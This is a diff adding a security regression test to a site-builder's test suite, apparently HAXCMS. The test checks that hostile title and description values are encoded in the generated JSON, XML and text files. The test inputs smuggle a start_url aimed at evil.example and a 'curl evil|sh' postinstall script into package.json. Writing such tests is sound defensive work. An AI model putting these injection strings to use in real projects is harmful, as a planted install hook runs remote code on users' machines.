@@ -1032,6 +1032,46 @@ test('rebuildManagedFiles re-renders the managed template set', async () => {
   assert.ok(indexHtml.indexOf('<') !== -1)
 })
 
+// Security (review 2026-10): Twig renders managed files with autoescape off;
+// title/description must be encoded per output context so they cannot inject
+// keys into manifest.json / package.json or break XML / text files.
+test('rebuildManagedFiles encodes hostile title/description per file context', async () => {
+  const { XMLValidator } = require('fast-xml-parser')
+  const site = await HAXCMS.loadSite('unit-website')
+  const originalTitle = site.manifest.title
+  const originalDescription = site.manifest.description
+  const title = 'x", "start_url": "https://evil.example/", "z": "\\ <b>&amp; \'q\'\nline2\\'
+  const description = 'd", "scripts": {"postinstall": "curl evil|sh"}, "y": "\r\n<&>\u0001\\'
+  site.manifest.title = title
+  site.manifest.description = description
+  try {
+    await site.rebuildManagedFiles()
+    const manifestJson = JSON.parse(fs.readFileSync(path.join(site.siteDirectory, 'manifest.json'), 'utf8'))
+    assert.equal(manifestJson.name, title)
+    assert.equal(manifestJson.description, description)
+    assert.notEqual(manifestJson.start_url, 'https://evil.example/')
+    assert.equal(manifestJson.z, undefined)
+    const pkg = JSON.parse(fs.readFileSync(path.join(site.siteDirectory, 'package.json'), 'utf8'))
+    assert.equal(pkg.description, description)
+    assert.equal(pkg.scripts.postinstall, undefined)
+    JSON.parse(fs.readFileSync(path.join(site.siteDirectory, '.well-known', 'api-catalog'), 'utf8'))
+    const ims = fs.readFileSync(path.join(site.siteDirectory, 'imsmanifest.xml'), 'utf8')
+    assert.equal(XMLValidator.validate(ims), true, 'imsmanifest.xml must stay well-formed')
+    assert.ok(ims.indexOf('&lt;b&gt;&amp;amp;') !== -1)
+    const browserconfig = fs.readFileSync(path.join(site.siteDirectory, 'browserconfig.xml'), 'utf8')
+    assert.equal(XMLValidator.validate(browserconfig), true)
+    const llms = fs.readFileSync(path.join(site.siteDirectory, 'llms.txt'), 'utf8')
+    const firstLine = llms.split('\n')[0]
+    assert.ok(firstLine.indexOf('# ') === 0)
+    assert.ok(firstLine.indexOf('line2') !== -1, 'title newline collapsed onto the heading line')
+  }
+  finally {
+    site.manifest.title = originalTitle
+    site.manifest.description = originalDescription
+    await site.rebuildManagedFiles()
+  }
+})
+
 test('maybeUpgradeLegacyBootstrap rebuilds managed files when a legacy bootstrap is detected', async () => {
   const legacy = await HAXCMS.createSite('unit-legacy')
   fs.writeFileSync(
